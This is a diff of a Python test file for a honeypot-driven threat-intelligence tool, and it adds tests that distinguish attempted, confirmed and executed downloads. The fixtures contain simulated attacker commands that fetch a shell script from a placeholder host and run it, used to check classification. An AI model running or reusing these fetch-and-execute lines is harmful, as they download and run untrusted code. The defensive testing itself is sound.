@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import asyncio
+import copy
 import json
 import os
 import sys
@@ -100,6 +101,7 @@ from production.correlation.session_ttp_correlation import (
 from production.prediction.session_features import build_session_features
 from production.workers.session_worker import SessionWorker
 from production.reporting.smb_decision import _features as smb_decision_features, build_smb_decision
+from production.reporting.threat_hypothesis import build_v2_report
 from production.storage import open_storage
 from production.workers.threat_hunt_worker import (
     ThreatHuntWorker,
@@ -5074,7 +5076,11 @@ def test_session_worker_stores_smb_decision_and_high_risk_alert() -> None:
 
         snapshot = json.loads(storage.list_rows("prediction_snapshots")[0]["payload_json"])
         assert snapshot["smb_decision"]["risk"]["severity"] == "high"
-        assert any("Rotate credentials" in item["action"] for item in snapshot["smb_decision"]["immediate_actions"])
+        assert any(
+            item["action_id"] == "rotate-affected-credentials"
+            and "rotate only credentials confirmed exposed or reused" in item["action"]
+            for item in snapshot["smb_decision"]["immediate_actions"]
+        )
         alerts = storage.list_rows("alerts")
         alert_payloads = [json.loads(row["payload_json"]) for row in alerts]
         assert any(payload.get("alert_type") == "smb_decision" for payload in alert_payloads)
@@ -7841,11 +7847,11 @@ def test_smb_decision_uses_trusted_policy_and_asset_context() -> None:
     )
     assert decision["mode"] == "smb_proactive_threat_intelligence"
     assert decision["risk"]["severity"] == "high"
-    assert "Credential theft" in decision["likely_goal"]["likely_goal"]
+    assert "Possible credential-related discovery" in decision["likely_goal"]["likely_goal"]
     assert decision["asset_context"]["matched_assets"][0]["asset_id"] == "ssh-admin"
     actions = [item["action"] for item in decision["immediate_actions"]]
-    assert any("Rotate credentials" in action for action in actions)
-    assert any("Block or rate-limit source IP 198.51.100.45" in action for action in actions)
+    assert any("rotate only credentials confirmed exposed or reused" in action for action in actions)
+    assert any("temporary rate limiting or blocking only when" in action for action in actions)
     refs = decision["immediate_actions"][0]["references"]
     assert refs and refs[0].get("url", "").startswith("https://")
     assert not decision["rejected_actions"]
@@ -7859,9 +7865,149 @@ def test_smb_decision_uses_trusted_policy_and_asset_context() -> None:
         assert item.get("severity") in {"info", "low", "medium", "high", "critical"}
         assert item.get("confidence") in {"low", "possible", "medium", "likely", "high"}
         assert item.get("evidence")
+        assert item.get("evidence_refs")
+        assert item.get("visibility_limitations")
         assert item.get("references")
         assert item["automation_safety"]["requires_manual_approval"] is True
         assert item["requires_manual_approval"] is True
+
+
+def test_smb_recommendations_distinguish_attempt_transfer_and_execution_evidence() -> None:
+    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
+    profile = {"schema_version": "smb_asset_profile.v1", "assets": []}
+    transfer_event = {
+        "command": "curl https://example.invalid/a.sh -o /tmp/a.sh",
+        "ttp": "T1105",
+        "tactic": "command-and-control",
+        "source": "rule",
+        "confidence": 1.0,
+        "high_confidence": True,
+        "evidence_id": "transfer-classification",
+        "command_outcome": "outcome_unknown",
+        "event_timestamp": "2026-07-16T00:00:01Z",
+        "cowrie_eventid": "cowrie.command.input",
+    }
+    payload = {
+        "session_id": "recommendation-transfer-attempt",
+        "src_ip": "192.0.2.10",
+        "protocol": "ssh",
+        "dst_port": 22,
+        "commands": [transfer_event["command"]],
+        "classification_events": [transfer_event],
+        "raw_events": [],
+    }
+
+    attempted = build_smb_decision(payload, asset_profile=profile, action_policy=policy)
+    attempt_ids = {item["action_id"] for item in attempted["immediate_actions"]}
+    assert attempted["risk"]["severity"] == "medium"
+    assert attempted["evidence"]["canonical_summary"]["confirmed_cowrie_transfer"] is False
+    assert "block-download-iocs" in attempt_ids
+    assert "hunt-cowrie-confirmed-artifact" not in attempt_ids
+    assert all(item["evidence_refs"] for item in attempted["immediate_actions"])
+    assert all(item["visibility_limitations"] for item in attempted["immediate_actions"])
+    assert not any("completed download" in item["why"].lower() for item in attempted["immediate_actions"])
+
+    confirmed_payload = copy.deepcopy(payload)
+    confirmed_payload["session_id"] = "recommendation-confirmed-transfer"
+    confirmed_payload["raw_events"] = [{
+        "eventid": "cowrie.session.file_download",
+        "timestamp": "2026-07-16T00:00:02Z",
+        "outfile": "/tmp/a.sh",
+        "shasum": "a" * 64,
+        "url": "https://example.invalid/a.sh",
+    }]
+    confirmed = build_smb_decision(confirmed_payload, asset_profile=profile, action_policy=policy)
+    confirmed_ids = {item["action_id"] for item in confirmed["immediate_actions"]}
+    assert confirmed["risk"]["severity"] == "high"
+    assert confirmed["evidence"]["canonical_summary"]["confirmed_cowrie_transfer"] is True
+    assert "hunt-cowrie-confirmed-artifact" in confirmed_ids
+    assert "block-download-iocs" not in confirmed_ids
+    assert not any("execution" in item["action"].lower() for item in confirmed["immediate_actions"])
+
+    execution_payload = copy.deepcopy(payload)
+    execution_payload["session_id"] = "recommendation-execution-attempt"
+    execution_payload["commands"].append("sh /tmp/a.sh")
+    execution_payload["classification_events"].append({
+        "command": "sh /tmp/a.sh",
+        "ttp": "T1059",
+        "tactic": "execution",
+        "source": "rule",
+        "confidence": 1.0,
+        "high_confidence": True,
+        "evidence_id": "execution-classification",
+        "command_outcome": "outcome_unknown",
+        "event_timestamp": "2026-07-16T00:00:03Z",
+        "cowrie_eventid": "cowrie.command.input",
+    })
+    execution = build_smb_decision(execution_payload, asset_profile=profile, action_policy=policy)
+    execution_action = next(
+        item for item in execution["immediate_actions"]
+        if item["action_id"] == "correlate-execution-attempt"
+    )
+    assert "outcome" in execution_action["why"].lower()
+    report = build_v2_report({
+        "recommended_actions_structured": execution["immediate_actions"],
+        "trusted_recommendation_decision": execution,
+    }, [execution_payload])
+    assert report["recommendations"]["operator_actions"]
+    assert all(
+        item["grounding_status"] == "canonical_observed_evidence"
+        for item in report["recommendations"]["operator_actions"]
+    )
+
+
+def test_smb_discovery_and_audit_only_sessions_remain_conservative() -> None:
+    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
+    profile = json.loads((ROOT / "configs" / "smb_asset_profile.example.json").read_text(encoding="utf-8"))
+    discovery = build_smb_decision(
+        {
+            "session_id": "recommendation-discovery",
+            "src_ip": "192.0.2.11",
+            "protocol": "ssh",
+            "dst_port": 22,
+            "commands": ["whoami"],
+            "classification_events": [{
+                "command": "whoami",
+                "ttp": "T1033",
+                "tactic": "discovery",
+                "source": "rule",
+                "confidence": 1.0,
+                "evidence_id": "discovery-evidence",
+            }],
+        },
+        asset_profile=profile,
+        action_policy=policy,
+    )
+    actions = discovery["immediate_actions"]
+    assert discovery["risk"]["severity"] == "low"
+    assert not any("rotate" in item["action"].lower() for item in actions)
+    assert not any(item["action"].startswith("Block ") for item in actions)
+
+    audit_only = build_smb_decision(
+        {
+            "session_id": "recommendation-audit-only",
+            "src_ip": "192.0.2.12",
+            "protocol": "ssh",
+            "dst_port": 22,
+            "commands": ["printf opaque"],
+            "classification_events": [{
+                "command": "printf opaque",
+                "ttp": "T1562",
+                "tactic": "defense-evasion",
+                "source": "securebert_low_confidence",
+                "confidence": 0.2,
+                "high_confidence": False,
+                "evidence_id": "audit-only-evidence",
+            }],
+        },
+        asset_profile=profile,
+        action_policy=policy,
+    )
+    assert "defense-evasion" not in audit_only["evidence"]["observed_tactics"]
+    assert not any(
+        item["rule_id"] == "defense-evasion-response"
+        for item in audit_only["immediate_actions"]
+    )
 
 
 def test_smb_action_policy_requires_trusted_references() -> None:
